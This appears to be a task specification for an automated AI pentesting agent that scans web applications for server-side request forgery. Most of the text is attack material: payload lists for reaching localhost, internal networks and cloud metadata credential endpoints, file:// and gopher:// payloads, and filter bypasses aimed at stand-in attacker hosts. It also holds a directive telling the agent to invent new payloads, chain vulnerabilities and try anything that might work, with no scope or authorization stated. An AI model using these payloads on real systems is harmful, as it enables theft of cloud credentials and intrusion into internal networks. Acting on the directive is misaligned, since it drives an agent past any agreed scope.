================================================================================
TASK 50 â€” SSRF DETECTION SCANNER
================================================================================
Covers testing_toolkit.txt Phase 5 Step 15 (Detection)
Exploitation â†’ Task 51

OBJECTIVE
â”€â”€â”€â”€â”€â”€â”€â”€â”€
Identify Server-Side Request Forgery (SSRF) vulnerabilities by:
- Scanning URL/redirect/callback parameters
- Detecting blind SSRF via OOB callbacks (Interactsh)
- Testing internal network access
- Identifying protocol handler support

================================================================================
                              INPUT FILES
================================================================================
PRIMARY (high-priority targets):
  outputs/queue_dynamic_endpoints_urls.txt    â† params to test
  outputs/arjun_found_params.txt              â† discovered hidden params
  outputs/api_endpoints_live.txt              â† authenticated API routes

SECONDARY (broaden coverage):
  outputs/har/common_data.txt                 â† HAR-extracted endpoints
  outputs/live_base_urls.txt                  â† base URLs

INTELLIGENCE (adaptive testing):
  outputs/waf_summary.json                    â† WAF bypass selection
  outputs/nuclei/tech_stack.json              â† tech stack detection

================================================================================
                             OUTPUT FILES
================================================================================
outputs/ssrf/
â”œâ”€â”€ ssrf_vulnerable.json          â† confirmed SSRF findings
â”œâ”€â”€ ssrf_blind_confirmed.json     â† blind SSRF via OOB
â”œâ”€â”€ ssrf_possible.txt             â† likely SSRF (manual verify)
â”œâ”€â”€ task51_targets.json           â† confirmed SSRFs for exploitation
â”œâ”€â”€ protocol_support.json         â† supported protocols per endpoint
â”œâ”€â”€ scan_log.txt                  â† execution log
â””â”€â”€ checkpoint.json               â† resume state

================================================================================
                         SSRF-LIKELY PARAMETERS
================================================================================
HIGH PRIORITY (test first):
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
url, uri, path, dest, redirect, target, rurl, return, returnUrl, return_url,
callback, next, data, reference, site, html, val, validate, domain, feed,
host, port, to, out, view, dir, show, navigation, open, file, document,
folder, pg, style, doc, img, filename

MEDIUM PRIORITY:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
source, src, imageURL, image_url, pic, picture, link, href, proxy, fetch,
load, request, page, pageUrl, api, endpoint, service, webhook, hook,
pingback, notify, notification, forward, goto

HEADER-BASED SSRF:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
X-Forwarded-Host, X-Original-URL, X-Rewrite-URL, Host, Referer, Origin,
X-Custom-IP-Authorization, X-Forwarded-For, X-Real-IP

================================================================================
                         SSRF DETECTION PAYLOADS
================================================================================

SECTION 1: LOCALHOST VARIANTS
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# IPv4 localhost
http://127.0.0.1
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.0.0.1:8080
http://127.1
http://127.000.000.001
http://2130706433                    â† decimal IP (127.0.0.1)
http://0x7f000001                    â† hex IP
http://017700000001                  â† octal IP
http://0                             â† 0.0.0.0
http://0.0.0.0

# IPv6 localhost
http://[::1]
http://[0000::1]
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]

# DNS-based localhost
http://localhost
http://localhost.localdomain
http://127.0.0.1.nip.io
http://localtest.me
http://spoofed.burpcollaborator.net  â† resolves to 127.0.0.1

SECTION 2: INTERNAL NETWORK RANGES
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Class A private
http://10.0.0.1
http://10.0.0.1:8080
http://10.255.255.255

# Class B private
http://172.16.0.1
http://172.31.255.255

# Class C private
http://192.168.0.1
http://192.168.1.1
http://192.168.1.254

# Link-local
http://169.254.0.1
http://169.254.169.254               â† AWS/GCP metadata

SECTION 3: CLOUD METADATA ENDPOINTS
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# AWS (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document

# AWS (IPv6)
http://[fd00:ec2::254]/latest/meta-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance
http://169.254.169.254/metadata/identity/oauth2/token

# DigitalOcean
http://169.254.169.254/metadata/v1/

# Oracle Cloud
http://169.254.169.254/opc/v1/instance/

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/

SECTION 4: OOB DETECTION (Interactsh)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Replace {INTERACT} with your Interactsh subdomain
http://{INTERACT}
http://{INTERACT}/ssrf-test
http://{INTERACT}:80
http://{INTERACT}:443
https://{INTERACT}

# DNS-only (for stricter filters)
http://ssrf.{INTERACT}
http://test.{INTERACT}

SECTION 5: PROTOCOL TESTING
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# File protocol (LFI via SSRF)
file:///etc/passwd
file:///c:/windows/win.ini
file://localhost/etc/passwd

# Dict protocol (port scan, info leak)
dict://127.0.0.1:22/info
dict://127.0.0.1:6379/info

# Gopher protocol (full control - see Task 51)
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a

# FTP protocol
ftp://127.0.0.1/
ftp://attacker.com/file

# LDAP protocol
ldap://127.0.0.1:389/%0astatus

# TFTP protocol
tftp://attacker.com/file

SECTION 6: BYPASS TECHNIQUES
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# URL encoding
http://127.0.0.1 â†’ http://%31%32%37%2e%30%2e%30%2e%31
http://localhost â†’ http://%6c%6f%63%61%6c%68%6f%73%74

# Double URL encoding
http://127.0.0.1 â†’ http://%25%33%31%25%33%32%25%33%37...

# DNS rebinding
http://attacker-controlled-domain.com    â† resolves to 127.0.0.1

# Redirect bypass
http://attacker.com/redirect?url=http://127.0.0.1

# Parser differential
http://127.0.0.1#@attacker.com
http://attacker.com@127.0.0.1
http://127.0.0.1%00@attacker.com
http://127.0.0.1%23@attacker.com

# Case manipulation
http://LOCALHOST
http://LocalHost

# Bracket tricks
http://127.0.0.1]/
http://127ã€‚0ã€‚0ã€‚1                    â† fullwidth dots

# URL fragment
http://attacker.com#http://127.0.0.1

# Authority confusion
http://127.0.0.1:80:80:80/

================================================================================
                              TOOL COMMANDS
================================================================================

SSRFmap (primary):
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Basic scan
ssrfmap -r request.txt -p url -m readfiles

# With custom payload
ssrfmap -r request.txt -p url -m portscan --lhost 127.0.0.1 --lport 1-1000

# Cloud metadata
ssrfmap -r request.txt -p url -m aws

SSRFire (alternative):
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Scan URL parameter
python ssrfire.py -u "https://target.com/fetch?url=FUZZ"

# With wordlist
python ssrfire.py -u "https://target.com/fetch?url=FUZZ" -w ssrf_payloads.txt

Interactsh (OOB listener):
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Start listener
interactsh-client -v

# Get subdomain: abc123.oast.fun
# Use in payloads: http://abc123.oast.fun/ssrf-test

================================================================================
                        DETECTION SIGNATURES
================================================================================

POSITIVE INDICATORS (SSRF confirmed):
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
- Response contains internal service data (Redis info, SSH banner)
- Response shows localhost HTML/content
- OOB callback received on Interactsh
- Cloud metadata content returned
- File contents returned (file:// protocol)
- Different response for internal vs external IPs
- Error messages revealing internal IPs/hostnames

ERROR-BASED DETECTION:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
- "Connection refused" for internal IP (service down but reachable)
- "Connection timed out" vs immediate failure (network filtering)
- "Name resolution failed" for .internal domains
- Stack traces showing URL fetching code

RESPONSE TIME-BASED:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
- Faster response for localhost (no network latency)
- Slower response for internal IPs (routing)
- Timeout differences for blocked vs allowed

================================================================================
                         EXECUTION WORKFLOW
================================================================================

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 1: Start OOB Listener                                                  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â€¢ Start interactsh-client                                                   â”‚
â”‚ â€¢ Record assigned subdomain (e.g., abc123.oast.fun)                         â”‚
â”‚ â€¢ This runs in background for entire scan                                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 2: Load & Classify Targets                                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â€¢ Load queue_dynamic_endpoints_urls.txt                                     â”‚
â”‚ â€¢ Load api_endpoints_live.txt                                               â”‚
â”‚ â€¢ Identify SSRF-likely parameters (url, redirect, callback, etc.)           â”‚
â”‚ â€¢ Prioritize by parameter name                                              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 3: Basic SSRF Testing                                                  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ FOR each SSRF candidate:                                                    â”‚
â”‚   a) Get baseline response (normal URL value)                               â”‚
â”‚   b) Test localhost variants (127.0.0.1, [::1], etc.)                       â”‚
â”‚   c) Test internal ranges (10.x, 172.16.x, 192.168.x)                       â”‚
â”‚   d) Test OOB callback (Interactsh URL)                                     â”‚
â”‚   e) Compare responses for indicators                                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 4: Cloud Metadata Testing                                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ FOR confirmed/possible SSRF:                                                â”‚
â”‚   a) Test AWS metadata: 169.254.169.254/latest/meta-data/                   â”‚
â”‚   b) Test GCP metadata: metadata.google.internal                            â”‚
â”‚   c) Test Azure metadata: 169.254.169.254/metadata/instance                 â”‚
â”‚   d) Record if metadata accessible â†’ HIGH SEVERITY                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 5: Protocol Support Testing                                            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ FOR confirmed SSRF:                                                         â”‚
â”‚   a) Test file:// protocol                                                  â”‚
â”‚   b) Test dict:// protocol                                                  â”‚
â”‚   c) Test gopher:// protocol                                                â”‚
â”‚   d) Record supported protocols â†’ feeds Task 51                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 6: Output & Feed Task 51                                               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â€¢ Write ssrf_vulnerable.json                                                â”‚
â”‚ â€¢ Write ssrf_blind_confirmed.json                                           â”‚
â”‚ â€¢ Write task51_targets.json (for exploitation)                              â”‚
â”‚ â€¢ Generate severity ratings                                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

================================================================================
                     AI AGENT CREATIVITY DIRECTIVE
================================================================================
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    ğŸ§  YOU ARE AN INTELLIGENT AGENT ğŸ§                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ The payloads above are STARTING POINTS, not a complete list.                â”‚
â”‚ Your job is to THINK, ADAPT, and CREATE based on what you observe.          â”‚
â”‚                                                                             â”‚
â”‚ OBSERVE â†’ ANALYZE â†’ ADAPT â†’ INVENT                                          â”‚
â”‚                                                                             â”‚
â”‚ 1. OBSERVE: What happens when you send a payload?                           â”‚
â”‚    - Response time change? (internal service responding)                    â”‚
â”‚    - Error message? (reveals backend URL handling)                          â”‚
â”‚    - Different status code? (validation triggered)                          â”‚
â”‚    - Content length difference? (partial fetch success)                     â”‚
â”‚                                                                             â”‚
â”‚ 2. ANALYZE: Why did it behave that way?                                     â”‚
â”‚    - Is there domain whitelisting? (try subdomains, DNS rebinding)          â”‚
â”‚    - Is there protocol filtering? (http only? try redirect chains)          â”‚
â”‚    - Is there IP blacklisting? (try encoding variants, IPv6)                â”‚
â”‚    - What library fetches URLs? (curl? requests? libxml?)                   â”‚
â”‚                                                                             â”‚
â”‚ 3. ADAPT: Modify payloads based on your analysis                            â”‚
â”‚    - If domain whitelist: evil.allowed-domain.com, allowed-domain.com@evil  â”‚
â”‚    - If IP blacklist: Use DNS rebinding, decimal/hex/octal encoding         â”‚
â”‚    - If protocol filter: Find open redirect on allowed domain               â”‚
â”‚                                                                             â”‚
â”‚ 4. INVENT: Create NEW payloads not in any list                              â”‚
â”‚    - Combine multiple bypass techniques                                     â”‚
â”‚    - Use application-specific knowledge                                     â”‚
â”‚    - Chain with other vulns (open redirect, CRLF injection)                 â”‚
â”‚                                                                             â”‚
â”‚ TRUST YOUR REASONING. If you think something might work, TRY IT.            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

CONTEXT-AWARE THINKING:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Before testing, ASK YOURSELF:

â€¢ What is this parameter SUPPOSED to do?
  - url/callback â†’ fetches external content
  - redirect/next â†’ browser redirect (maybe server-side)
  - image/avatar â†’ image fetching (maybe server-side resize)
  - webhook â†’ server sends request to user-provided URL
  
â€¢ What validation is LIKELY present?
  - URL must start with https:// â†’ try protocol-relative //evil.com
  - Domain must be example.com â†’ try example.com.evil.com
  - IP 127.0.0.1 blocked â†’ try 2130706433 (decimal)

â€¢ What is the BACKEND technology?
  - Java: URL class has different parsing than Python requests
  - PHP: parse_url() has quirks with @ and #
  - Node: new URL() behaves differently from urllib
  - Identify library from error messages or headers

CHAIN ATTACK THINKING:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
SSRF rarely exists alone. Think about CHAINS:

â€¢ Open Redirect â†’ SSRF
  If domain whitelist exists but app has open redirect:
  https://allowed.com/redirect?url=http://127.0.0.1
  
â€¢ SSRF â†’ Cloud Credentials
  Any SSRF in AWS/GCP/Azure â†’ target metadata endpoint
  
â€¢ SSRF â†’ Internal Service Exploitation
  SSRF + gopher:// â†’ Redis/Memcached/SMTP command injection
  
â€¢ SSRF â†’ Internal Network Mapping
  Use response time/size to map internal network

THINK LIKE THE DEVELOPER:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Typical URL fetching code:

```python
# Vulnerable
url = request.params['url']
response = requests.get(url)
return response.content

# With validation (what you need to bypass)
url = request.params['url']
if not url.startswith('https://allowed-domain.com'):
    return error
response = requests.get(url)
```

Bypass strategies:
- https://allowed-domain.com@attacker.com
- https://allowed-domain.com.attacker.com
- https://attacker.com#https://allowed-domain.com
- https://attacker.com/redirect?to=http://127.0.0.1

================================================================================
                              CHECKPOINT/RESUME
================================================================================
checkpoint.json format:
{
  "last_target_index": 150,
  "interactsh_subdomain": "abc123.oast.fun",
  "oob_callbacks_received": ["callback1", "callback2"],
  "confirmed_ssrf": 3,
  "timestamp": "2026-01-13T10:30:00Z"
}

================================================================================
                             9-MINUTE BATCHING
================================================================================
- Process 30 targets per batch (SSRF testing is slower)
- Check Interactsh for OOB callbacks after each batch
- Write outputs after each batch
- Checkpoint every batch
- Total timeout: 8 minutes active + 1 minute output

================================================================================
                                  NOTES
================================================================================
- ALWAYS start Interactsh FIRST (OOB detection is crucial for blind SSRF)
- Cloud metadata SSRF is HIGH SEVERITY (credential theft)
- gopher:// protocol enables exploitation â†’ Task 51
- Many SSRFs are BLIND - no response, only OOB callback
- DNS rebinding requires attacker-controlled domain
================================================================================
